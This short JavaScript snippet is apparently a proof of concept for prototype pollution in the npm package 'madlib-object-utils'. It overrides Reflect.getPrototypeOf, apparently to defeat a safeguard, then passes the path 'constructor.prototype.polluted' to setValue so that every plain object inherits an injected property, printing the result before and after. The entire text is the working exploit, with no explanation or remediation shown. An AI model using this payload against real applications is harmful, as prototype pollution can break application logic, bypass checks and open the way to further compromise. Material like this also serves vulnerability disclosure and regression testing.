Reflect.getPrototypeOf = () => false;
console.log({}.polluted);
const objectUtils = require('madlib-object-utils');
objectUtils.setValue('constructor.prototype.polluted', {}, 'yes');
console.log({}.polluted);